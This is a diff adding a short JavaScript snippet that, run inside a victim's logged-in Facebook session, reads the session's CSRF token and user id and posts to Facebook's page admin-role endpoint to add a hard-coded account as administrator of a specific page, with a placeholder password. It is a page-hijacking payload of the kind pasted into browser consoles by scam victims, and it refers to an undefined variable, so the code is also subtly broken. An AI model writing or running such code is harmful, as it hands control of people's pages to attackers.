@@ -1,0 +1,18 @@
+var spinR = require(["SiteData"]).__spin_r;
+var spinB = require(["SiteData"]).__spin_b;
+var spinT = require(["SiteData"]).__spin_t;
+var jazoest = "22014";
+var fbdtsg = require(["DTSGInitData"]).token;
+var userId = require(["CurrentUserInitialData"]).USER_ID;
+var hsi = require(["SiteData"]).hsi;
+var adminpage = "uidadmin";
+var PW = "matkhauvia";
+var url = "https://www.facebook.com/presma/admin_roles/add_admin/";
+var data = "user_id="+uidadmin+"&role=0&page_id=108988848630017&use_roles=false&__user="+userId+"&__a=1&__dyn=&__csr=&__req=&__hs=&dpr=&__ccg=&__rev=&__s=s1i2u6%3A2bvrml%3Attwlfp&__hsi=&__comet_req=&cquick=&cquick_token=&ctarget=https%3A%2F%2Fwww.facebook.com&fb_dtsg="+fbdtsg+"&jazoest=25516&lsd=&__spin_r=&__spin_b=&__spin_t=&ajax_password="+PW+"&confirmed=1";
+fetch(url, {
+    method: 'POST',
+    body: data,
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+}).then(e => e.text()).then(e => {})
